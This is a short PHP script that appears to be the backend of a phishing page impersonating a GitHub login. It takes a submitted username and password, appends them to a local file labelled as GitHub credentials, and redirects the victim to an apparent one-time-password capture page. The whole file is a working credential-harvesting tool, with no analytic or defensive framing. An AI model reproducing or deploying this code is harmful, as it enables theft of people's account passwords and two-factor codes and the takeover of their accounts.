<?php
file_put_contents("usernames.txt", "GitHub Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
?>